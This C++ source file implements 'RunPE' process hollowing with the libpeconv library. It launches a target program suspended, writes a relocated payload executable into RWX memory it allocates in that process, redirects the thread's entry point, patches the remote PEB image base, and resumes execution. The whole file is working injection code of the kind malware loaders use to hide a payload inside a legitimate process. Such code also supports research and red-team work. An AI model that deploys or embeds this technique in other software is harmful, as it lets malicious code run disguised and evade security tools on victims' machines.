#include "run_pe.h"

#include "peconv.h"

bool create_new_process(IN LPSTR path, OUT PROCESS_INFORMATION &pi)
{
    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(
            NULL,
            path,
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!ReadProcessMemory(hProcess, LPVOID(remote_addr), buffer, buffer_size, NULL)) {
        printf("[ERROR] Cannot read from the remote memory!\n");
        return false;
    }
    return true;
}

bool get_remote_context(PROCESS_INFORMATION &pi, CONTEXT &context)
{
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    return GetThreadContext(pi.hThread, &context);
}

bool update_peb_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, ULONGLONG entry_point_va)
{
    printf("Writing new EP: %x\n", entry_point_va);
#if defined(_WIN64)
    context.Rcx = entry_point_va;
#else
    context.Eax = entry_point_va;
#endif
    if (SetThreadContext(pi.hThread, &context)) {
        return true;
    }
    DWORD last_err = GetLastError();
    printf("last err: %d %x\n", last_err, last_err);
    return false;
}

ULONGLONG get_remote_peb_addr(const CONTEXT &context)
{
    ULONGLONG PEB_addr = 0;
#if defined(_WIN64)
    PEB_addr = context.Rdx;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, CONTEXT &context)
{
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;
    if (!update_peb_entry_point(pi, context, ep_va)) {
        printf("Cannot update PEB!\n");
        return false;
    }
    ULONGLONG peb_addr = get_remote_peb_addr(context);
    PEB* remote_peb = (PEB*) peb_addr;
    LPVOID remote_img_base = &(remote_peb->ImageBaseAddress);

    printf("Remote PEB: %p\n", remote_peb);
    printf("Remote img_base: %p\n", remote_img_base);

    SIZE_T written = 0;
    const size_t img_base_size = sizeof(PVOID);

    printf("ImageBaseSize: %d\n", img_base_size);

    if (!WriteProcessMemory(pi.hProcess, remote_img_base, 
        &load_base, img_base_size, 
        &written)) 
    {
        printf("Cannot update ImageBaseAddress!\n");
        return false;
    }
    return true;
}

bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi)
{
    if (loaded_pe == NULL) return false;

    CONTEXT context = { 0 };
    if (!get_remote_context(pi, context)) {
        printf("Getting remote context failed!\n");
        return false;
    }
    ULONGLONG remote_peb_addr = get_remote_peb_addr(context);
    if (!remote_peb_addr) {
        printf("Failed getting remote PEB address!\n");
        return false;
    }
    PEB peb = { 0 };
    if (!read_remote_mem(pi.hProcess, remote_peb_addr, &peb, sizeof(PEB))) {
        printf("Failed reading remote PEB!\n");
        return false;
    }
#ifdef _DEBUG
    printf("targetImageBase = %x\n", peb.ImageBaseAddress);
#endif

    //try to allocate space that will be the most suitable for the payload:
    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteAddress, static_cast<ULONG>(payloadImageSize));
    
    bool is_ok = relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteAddress);
    if (!is_ok) {
        printf("Could not relocate the module!\n");
        return false;
    }
    set_subsystem(loaded_pe, IMAGE_SUBSYSTEM_WINDOWS_GUI);
    update_image_base(loaded_pe, (ULONGLONG)remoteAddress);

#ifdef _DEBUG
    printf("Writing to remote process...\n");
#endif
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteAddress, loaded_pe, payloadImageSize, &written)) {
        return false;
    }
#ifdef _DEBUG
    printf("Loaded at: %p\n", loaded_pe);
#endif
    if (!redirect_to_payload(loaded_pe, remoteAddress, pi, context)) {
        printf("Redirecting failed!\n");
        return false;
    }
    ResumeThread(pi.hThread);
    return true;
}

bool run_pe(char *payloadPath, char *targetPath)
{
    //1. Load the payload:
    size_t payloadImageSize = 0;
    // Load the current executable from the file with the help of libpeconv:
    BYTE* loaded_pe = load_pe_module(payloadPath, payloadImageSize, false);
    if (!loaded_pe) {
        printf("Loading failed!\n");
        return false;
    }

    //2. Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_new_process(targetPath, pi);
    if (!is_created) {
        printf("Creating target process failed!\n");
        free_pe_module(loaded_pe, payloadImageSize);
        return false;
    }
    
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadImageSize, pi);

    //4. Cleanup:
    free_pe_module(loaded_pe, payloadImageSize);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    //---
    return isOk;
}